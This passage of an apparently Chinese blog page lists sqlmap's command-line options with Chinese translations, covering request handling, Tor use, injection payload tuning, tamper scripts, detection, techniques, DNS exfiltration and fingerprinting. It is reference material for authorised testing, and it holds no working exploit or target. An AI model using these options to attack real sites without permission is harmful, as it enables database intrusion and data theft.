class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Request（请求）:</span><br><span class=\"line\">​</span><br><span class=\"line\">These options can be used <span class=\"keyword\">to</span> specify how <span class=\"keyword\">to</span> connect <span class=\"keyword\">to</span> the target URL</span><br><span class=\"line\"><span class=\"comment\">## 这些选项可以用来指定如何连接到目标URL。</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--method</span>=METHOD Force usage of given HTTP method (e.g. PUT)</span><br><span class=\"line\"><span class=\"comment\">## 强制使用给定的HTTP方法（e.g. PUT）</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--data</span>=DATA Data string <span class=\"keyword\">to</span> be sent through POST</span><br><span class=\"line\"><span class=\"comment\">## 通过POST发送的数据字符串</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--param-del</span>=PARA.. Character used <span class=\"keyword\">for</span> splitting parameter values</span><br><span class=\"line\"><span class=\"comment\">## 用于拆分参数值的字符</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--cookie</span>=COOKIE HTTP Cookie header value HTTP</span><br><span class=\"line\"><span class=\"comment\">## Cookie头的值</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--cookie-del</span>=COO.. Character used <span class=\"keyword\">for</span> splitting cookie values</span><br><span class=\"line\"><span class=\"comment\">## 用于分割Cookie值的字符</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">--load-cookies</span>=L.. File containing cookies <span class=\"keyword\">in</span> Netscape/wget format</span><br><span class=\"line\"><span class=\"comment\">## 包含Netscape / wget格式的cookie的文件</span></span><br><span class=\"line\"></span><br><span class=\"line\">--drop-set-cookie Ignore Set-Cookie header <span class=\"keyword\">from</span> response</span><br><span class=\"line\"><span class=\"comment\">## 从响应中忽略Set-Cookie头</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">--user-agent</span>=AGENT HTTP User-Agent header value</span><br><span class=\"line\"><span class=\"comment\">## 指定 HTTP User - Agent头</span></span><br><span class=\"line\"></span><br><span class=\"line\">--random-agent Use randomly selected HTTP User-Agent header value</span><br><span class=\"line\"><span class=\"comment\">##  使用随机选定的HTTP User - Agent头</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">--host</span>=HOST HTTP Host header value</span><br><span class=\"line\"><span class=\"comment\">## HTTP主机头值</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">--referer</span>=REFERER HTTP Referer header value</span><br><span class=\"line\"><span class=\"comment\">##  指定 HTTP Referer头</span></span><br><span class=\"line\"></span><br><span class=\"line\">-H HEADER, --hea<span class=\"built_in\">..</span> Extra header (e.g. <span class=\"string\">\"X-Forwarded-For: 127.0.0.1\"</span>)</span><br><span class=\"line\"><span class=\"comment\">## 额外header</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">--headers</span>=HEADERS Extra headers (e.g. <span class=\"string\">\"Accept-Language: fr\\\\nETag: 123\"</span>)</span><br><span class=\"line\"><span class=\"comment\">## 额外header</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">--auth-type</span>=AUTH.. HTTP authentication<span class=\"built_in\"> type </span>(Basic, Digest, NTLM <span class=\"keyword\">or</span> PKI)HTTP</span><br><span class=\"line\"><span class=\"comment\">## 认证类型(Basic, Digest, NTLM or PKI)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">--auth-cred</span>=AUTH.. HTTP authentication credentials (name:password)</span><br><span class=\"line\"><span class=\"comment\">##  HTTP认证凭证(name:password)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">--auth-file</span>=AUTH.. HTTP authentication PEM cert/private key file</span><br><span class=\"line\"><span class=\"comment\">## HTTP认证 PEM认证/私钥文件</span></span><br><span class=\"line\"></span><br><span class=\"line\">--ignore-401 Ignore HTTP <span class=\"builtin-name\">Error</span> 401 (Unauthorized)</span><br><span class=\"line\"><span class=\"comment\">## 忽略HTTP错误401</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">--proxy</span>=PROXY Use a<span class=\"built_in\"> proxy </span><span class=\"keyword\">to</span> connect <span class=\"keyword\">to</span> the target URL</span><br><span class=\"line\"><span class=\"comment\">## 使用代理连接到目标网址</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">--proxy-cred</span>=PRO..<span class=\"built_in\"> Proxy </span>authentication credentials (name:password)</span><br><span class=\"line\"><span class=\"comment\">## 代理认证证书(name:password)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">--proxy-file</span>=PRO.. Load<span class=\"built_in\"> proxy </span>list <span class=\"keyword\">from</span> a file</span><br><span class=\"line\"><span class=\"comment\">## 从文件中加载代理列表</span></span><br><span class=\"line\"></span><br><span class=\"line\">--ignore-proxy Ignore<span class=\"built_in\"> system default proxy </span>settings</span><br><span class=\"line\"><span class=\"comment\">## 忽略系统默认代理设置</span></span><br><span class=\"line\"></span><br><span class=\"line\">--tor Use Tor anonymity network</span><br><span class=\"line\"><span class=\"comment\">## 使用Tor匿名网络</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">--tor-port</span>=TORPORT <span class=\"builtin-name\">Set</span> Tor<span class=\"built_in\"> proxy port </span>other than default</span><br><span class=\"line\"><span class=\"comment\">##  设置Tor代理端口而不是默认值</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">--tor-type</span>=TORTYPE <span class=\"builtin-name\">Set</span> Tor<span class=\"built_in\"> proxy type </span>(HTTP (default), SOCKS4 <span class=\"keyword\">or</span> SOCKS5)</span><br><span class=\"line\"><span class=\"comment\">## 设置Tor代理类型</span></span><br><span class=\"line\"></span><br><span class=\"line\">--check-tor Check <span class=\"keyword\">to</span> see <span class=\"keyword\">if</span> Tor is used properly</span><br><span class=\"line\"><span class=\"comment\">## 检查Tor是否正确使用</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">--delay</span>=DELAY Delay <span class=\"keyword\">in</span> seconds between each HTTP request</span><br><span class=\"line\"><span class=\"comment\">## 每个HTTP请求之间的延迟（秒）</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">--timeout</span>=TIMEOUT Seconds <span class=\"keyword\">to</span> wait before timeout<span class=\"built_in\"> connection </span>(default 30)</span><br><span class=\"line\"><span class=\"comment\">## 秒超时连接前等待（默认30）</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">--retries</span>=RETRIES Retries when the<span class=\"built_in\"> connection </span>timeouts (default 3)</span><br><span class=\"line\"><span class=\"comment\">##  连接超时时重试（默认值3）</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">--randomize</span>=RPARAM Randomly change value <span class=\"keyword\">for</span> given parameter(s)</span><br><span class=\"line\"><span class=\"comment\">## 随机更改给定参数的值(s)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">--safe-url</span>=SAFEURL URL<span class=\"built_in\"> address </span><span class=\"keyword\">to</span> visit frequently during testing</span><br><span class=\"line\"><span class=\"comment\">## 在测试期间频繁访问的URL地址</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">--safe-post</span>=SAFE.. POST data <span class=\"keyword\">to</span> send <span class=\"keyword\">to</span> a safe URL</span><br><span class=\"line\"><span class=\"comment\">## POST数据发送到安全URL</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">--safe-req</span>=SAFER.. Load safe HTTP request <span class=\"keyword\">from</span> a file</span><br><span class=\"line\"><span class=\"comment\">## 从文件加载安全HTTP请求</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">--safe-freq</span>=SAFE.. Test requests between two visits <span class=\"keyword\">to</span> a given safe URL</span><br><span class=\"line\"><span class=\"comment\">## 在两次访问给定安全网址之间测试请求</span></span><br><span class=\"line\"></span><br><span class=\"line\">--skip-urlencode Skip URL encoding of payload data</span><br><span class=\"line\"><span class=\"comment\">## 跳过有效载荷数据的URL编码</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">--csrf-token</span>=CSR.. Parameter used <span class=\"keyword\">to</span> hold anti-CSRF token</span><br><span class=\"line\"><span class=\"comment\">## 参数用于保存anti-CSRF令牌</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">--csrf-url</span>=CSRFURL URL<span class=\"built_in\"> address </span><span class=\"keyword\">to</span> visit <span class=\"keyword\">to</span> extract anti-CSRF token</span><br><span class=\"line\"><span class=\"comment\">## 提取anti-CSRF URL地址访问令牌</span></span><br><span class=\"line\"></span><br><span class=\"line\">--force-ssl Force usage of SSL/HTTPS</span><br><span class=\"line\"><span class=\"comment\">## 强制使用SSL /HTTPS</span></span><br><span class=\"line\"></span><br><span class=\"line\">--hpp Use HTTP parameter pollution method</span><br><span class=\"line\"><span class=\"comment\">## 使用HTTP参数pollution的方法</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">--eval</span>=EVALCODE Evaluate provided Python code before the request (e.g. 评估请求之前提供Python代码<span class=\"string\">\"import hashlib;id2=hashlib.md5(id).hexdigest()\"</span>)</span><br></pre></td></tr></table></figure>\n<h3 id=\"Optimization（优化）\"><a href=\"#Optimization（优化）\" class=\"headerlink\" title=\"Optimization（优化）\"></a>Optimization（优化）</h3><figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Optimization（优化）:</span><br><span class=\"line\">​</span><br><span class=\"line\">These options can be used <span class=\"keyword\">to</span> optimize the performance of sqlmap</span><br><span class=\"line\"><span class=\"comment\">## 这些选项可用于优化sqlmap的性能</span></span><br><span class=\"line\">​</span><br><span class=\"line\">-o Turn on all optimization switches</span><br><span class=\"line\"><span class=\"comment\">## 开启所有优化开关</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--predict-output Predict common queries output</span><br><span class=\"line\"><span class=\"comment\">## 预测常见的查询输出</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--keep-alive Use persistent HTTP(s) connections</span><br><span class=\"line\"><span class=\"comment\">## 使用持久的HTTP（S）连接</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--null-connection Retrieve<span class=\"built_in\"> page </span>length without actual HTTP response body</span><br><span class=\"line\"><span class=\"comment\">## 从没有实际的HTTP响应体中检索页面长度</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--threads</span>=THREADS Max number of concurrent HTTP(s) requests (default 1)</span><br><span class=\"line\"><span class=\"comment\">## 最大的HTTP（S）请求并发量（默认为1）</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"Injection（注入）\"><a href=\"#Injection（注入）\" class=\"headerlink\" title=\"Injection（注入）\"></a>Injection（注入）</h3><figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Injection（注入）:</span><br><span class=\"line\">​</span><br><span class=\"line\">These options can be used <span class=\"keyword\">to</span> specify which parameters <span class=\"keyword\">to</span> test <span class=\"keyword\">for</span>, provide custom injection payloads <span class=\"keyword\">and</span> optional tampering scripts</span><br><span class=\"line\"><span class=\"comment\">##  这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。</span></span><br><span class=\"line\">​</span><br><span class=\"line\">-p TESTPARAMETER Testable parameter(s)</span><br><span class=\"line\"><span class=\"comment\">## 可测试的参数（S）</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--skip</span>=SKIP Skip testing <span class=\"keyword\">for</span> given parameter(s)</span><br><span class=\"line\"><span class=\"comment\">## 跳过对给定参数的测试</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--skip-static Skip testing parameters that <span class=\"keyword\">not</span> appear <span class=\"keyword\">to</span> be dynamic</span><br><span class=\"line\"><span class=\"comment\">## 跳过测试不显示为动态的参数</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--param-exclude</span>=.. Regexp <span class=\"keyword\">to</span> exclude parameters <span class=\"keyword\">from</span> testing (e.g. <span class=\"string\">\"ses\"</span>)</span><br><span class=\"line\"><span class=\"comment\">## 使用正则表达式排除参数进行测试（e.g. \"ses\"）</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--dbms</span>=DBMS Force back-end DBMS <span class=\"keyword\">to</span> this value</span><br><span class=\"line\"><span class=\"comment\">## 强制后端的DBMS为此值</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--dbms-cred</span>=DBMS.. DBMS authentication credentials (user:password)</span><br><span class=\"line\"><span class=\"comment\">## DBMS认证凭证(user:password)</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--os</span>=OS Force back-end DBMS operating<span class=\"built_in\"> system </span><span class=\"keyword\">to</span> this value</span><br><span class=\"line\"><span class=\"comment\">## 强制后端的DBMS操作系统为这个值</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--invalid-bignum Use big numbers <span class=\"keyword\">for</span> invalidating values</span><br><span class=\"line\"><span class=\"comment\">## 使用大数字使值无效</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--invalid-logical Use logical operations <span class=\"keyword\">for</span> invalidating values</span><br><span class=\"line\"><span class=\"comment\">## 使用逻辑操作使值无效</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--invalid-string Use random strings <span class=\"keyword\">for</span> invalidating values</span><br><span class=\"line\"><span class=\"comment\">## 使用随机字符串使值无效</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--no-cast Turn off payload casting mechanism</span><br><span class=\"line\"><span class=\"comment\">## 关闭有效载荷铸造机制</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--no-escape Turn off string escaping mechanism</span><br><span class=\"line\"><span class=\"comment\">## 关闭字符串转义机制</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--prefix</span>=PREFIX Injection payload<span class=\"built_in\"> prefix </span>string</span><br><span class=\"line\"><span class=\"comment\">## 注入payload字符串前缀</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--suffix</span>=SUFFIX Injection payload suffix string</span><br><span class=\"line\"><span class=\"comment\">## 注入payload字符串后缀</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--tamper</span>=TAMPER Use given script(s) <span class=\"keyword\">for</span> tampering injection data</span><br><span class=\"line\"><span class=\"comment\">## 使用给定的脚本（S）篡改注入数据</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"Detection（检测）\"><a href=\"#Detection（检测）\" class=\"headerlink\" title=\"Detection（检测）\"></a>Detection（检测）</h3><figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Detection（检测）:</span><br><span class=\"line\">These options can be used <span class=\"keyword\">to</span> customize the detection phase</span><br><span class=\"line\"><span class=\"comment\">## 这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--level</span>=LEVEL Level of tests <span class=\"keyword\">to</span> perform (1-5,<span class=\"built_in\"> default </span>1)</span><br><span class=\"line\"><span class=\"comment\">## 执行测试的等级（1-5，默认为1）</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--risk</span>=RISK Risk of tests <span class=\"keyword\">to</span> perform (1-3,<span class=\"built_in\"> default </span>1)</span><br><span class=\"line\"><span class=\"comment\">## 执行测试的风险（0-3，默认为1）</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--string</span>=STRING String <span class=\"keyword\">to</span> match when query is evaluated <span class=\"keyword\">to</span> <span class=\"literal\">True</span></span><br><span class=\"line\"><span class=\"comment\">##  查询时有效时在页面匹配字符串</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--not-string</span>=NOT.. String <span class=\"keyword\">to</span> match when query is evaluated <span class=\"keyword\">to</span> <span class=\"literal\">False</span></span><br><span class=\"line\"><span class=\"comment\">## 当查询求值为无效时匹配的字符串</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--regexp</span>=REGEXP Regexp <span class=\"keyword\">to</span> match when query is evaluated <span class=\"keyword\">to</span> <span class=\"literal\">True</span></span><br><span class=\"line\"><span class=\"comment\">## 查询时有效时在页面匹配正则表达式</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--code</span>=CODE HTTP code <span class=\"keyword\">to</span> match when query is evaluated <span class=\"keyword\">to</span> <span class=\"literal\">True</span></span><br><span class=\"line\"><span class=\"comment\">## 当查询求值为True时匹配的HTTP代码</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--text-only Compare pages based only on the textual content</span><br><span class=\"line\"><span class=\"comment\">## 仅基于在文本内容比较网页</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--titles Compare pages based only on their titles</span><br><span class=\"line\"><span class=\"comment\">##  仅根据他们的标题进行比较</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"Techniques（技巧）\"><a href=\"#Techniques（技巧）\" class=\"headerlink\" title=\"Techniques（技巧）\"></a>Techniques（技巧）</h3><figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Techniques（技巧）:</span><br><span class=\"line\">These options can be used <span class=\"keyword\">to</span> tweak testing of specific SQL injection techniques</span><br><span class=\"line\"><span class=\"comment\">## 这些选项可用于调整具体的SQL注入测试。</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--technique</span>=TECH SQL injection techniques <span class=\"keyword\">to</span> use (default <span class=\"string\">\"BEUSTQ\"</span>)</span><br><span class=\"line\"><span class=\"comment\">## SQL 注入技术测试（默认BEUST）</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--time-sec</span>=TIMESEC Seconds <span class=\"keyword\">to</span> delay the DBMS response (default 5)</span><br><span class=\"line\"><span class=\"comment\">##  DBMS响应的延迟时间（默认为5秒）</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--union-cols</span>=UCOLS Range of columns <span class=\"keyword\">to</span> test <span class=\"keyword\">for</span> UNION query SQL injection</span><br><span class=\"line\"><span class=\"comment\">##  定列范围用于测试UNION查询注入</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--union-char</span>=UCHAR Character <span class=\"keyword\">to</span> use <span class=\"keyword\">for</span> bruteforcing number of columns</span><br><span class=\"line\"><span class=\"comment\">##  用于暴力猜解列数的字符</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--union-from</span>=UFROM Table <span class=\"keyword\">to</span> use <span class=\"keyword\">in</span> <span class=\"keyword\">FROM</span> part of UNION query SQL injection</span><br><span class=\"line\"><span class=\"comment\">##  要在UNION查询SQL注入的FROM部分使用的表</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--dns-domain</span>=DNS.. Domain name used <span class=\"keyword\">for</span><span class=\"built_in\"> DNS </span>exfiltration attack</span><br><span class=\"line\"><span class=\"comment\">##  域名用于DNS漏出攻击</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--second-order</span>=S.. Resulting<span class=\"built_in\"> page </span>URL searched <span class=\"keyword\">for</span> second-order response</span><br><span class=\"line\"><span class=\"comment\">## 生成页面的URL搜索为second-order响应</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"Fingerprint（指纹）\"><a href=\"#Fingerprint（指纹）\" class=\"headerlink\" title=\"Fingerprint（指纹）\"></a>Fingerprint（指纹）</h3><figure class=\"highlight applescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Fingerprint（指纹）:</span><br><span class=\"line\">​</span><br><span class=\"line\">-f, <span class=\"comment\">--fingerprint Perform an extensive DBMS version fingerprint</span></span><br><span class=\"line\"><span class=\"comment\">## 执行检查广泛的DBMS版本指纹</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"Enumeration（枚举）\"><a href=\"#Enumeration（枚举）\" class=\"headerlink\" title=\"Enumeration（枚举）\"></a>Enumeration（枚举）</h3><figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span 